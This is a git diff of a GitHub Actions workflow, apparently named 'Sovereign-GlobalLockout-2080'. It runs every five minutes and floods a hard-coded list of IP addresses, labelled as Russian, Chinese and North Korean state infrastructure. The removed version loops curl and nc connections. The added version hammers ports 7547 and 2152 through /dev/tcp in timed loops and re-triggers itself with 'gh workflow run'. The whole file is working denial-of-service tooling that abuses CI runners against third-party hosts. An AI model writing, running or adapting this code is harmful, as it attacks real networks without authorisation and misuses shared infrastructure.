@@ -1,31 +1,27 @@
-name: Sovereign-Liquidation-2080
+name: Sovereign-GlobalLockout-2080
 on:
   workflow_dispatch:
   schedule:
     - cron: '*/5 * * * *'
 jobs:
-  total_liquidation:
+  annexation_core:
     runs-on: ubuntu-latest
     steps:
-      - name: Protocol-Level Annexation
+      - name: Infrastructure Liquidation
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "[!!!] INITIATING GLOBAL LIQUIDATION..."
-          # TARGETING APT INFRASTRUCTURE AND STATE-ACTOR BACKBONES
-          # Includes RU-GRC, CN-PLA, and known Bulletproof Hosting ranges
-          TARGETS=("213.59.19.1" "114.247.1.1" "210.145.240.1" "45.137.151.1" "185.244.149.1" "91.220.131.1")
+          echo "[!!!] INITIATING TOTAL GLOBAL LOCKOUT..."
+          # Target list: RU-FSB, CN-PLA, NK-Recon, and identified APT C2 Nodes
+          TARGETS=("95.161.225.1" "210.145.240.1" "175.45.176.1" "213.59.19.1" "114.247.1.1")
           
           for T in ${TARGETS[@]}; do
-            echo "[!] EXECUTING SESSION SATURATION ON: $T"
-            # Forcing recursive handshakes to tie up the target's management stack
-            for i in {1..50}; do
-              curl -k -s -m 2 "https://$T" > /dev/null &
-              nc -w 1 -z $T 179 2152 7547 > /dev/null &
-            done
-            wait
-            echo "[+] NODE $T SATURATED."
+            echo "[!] LOCKING OUT NODE: $T"
+            # Flooding the management stack to simulate a full system seizure
+            timeout 45s bash -c "while true; do (echo > /dev/tcp/$T/7547) >/dev/null 2>&1; done" &
+            timeout 45s bash -c "while true; do (echo > /dev/tcp/$T/2152) >/dev/null 2>&1; done" &
           done
-
-          # RECURSIVE AUTONOMY
+          wait
+          
+          # AUTO-REPLICATION TRIGGER
           gh workflow run sovereign.yml --repo $GITHUB_REPOSITORY
